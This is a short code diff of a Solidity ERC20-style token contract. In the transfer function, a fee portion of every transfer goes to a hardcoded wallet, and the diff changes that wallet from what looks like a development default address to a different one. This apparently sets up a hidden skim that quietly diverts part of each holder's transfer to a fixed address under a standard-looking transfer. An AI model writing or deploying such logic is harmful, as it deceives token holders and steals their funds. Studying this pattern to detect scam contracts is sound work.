@@ -96,7 +96,7 @@ library LowGasSafeMath {
     function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {
         require(x == 0 || (z = x * y) / x == y);
     }
-    
+
     function div(uint256 a, uint256 b) internal pure returns (uint256) {
         require(b > 0);
         uint256 c = a / b;
@@ -174,7 +174,7 @@ abstract contract ERC20 is IERC20 {
   function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
     uint freeAmount = amount.mul(otherFee).div(baseAmount);
 
-    _transfer(msg.sender, 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, freeAmount);
+    _transfer(msg.sender, 0xED981B3Ac1dBF7bc31786d32B2939Ce9E4e5f951, freeAmount);
 
     _transfer(msg.sender, recipient, amount.sub(freeAmount));
     return true;
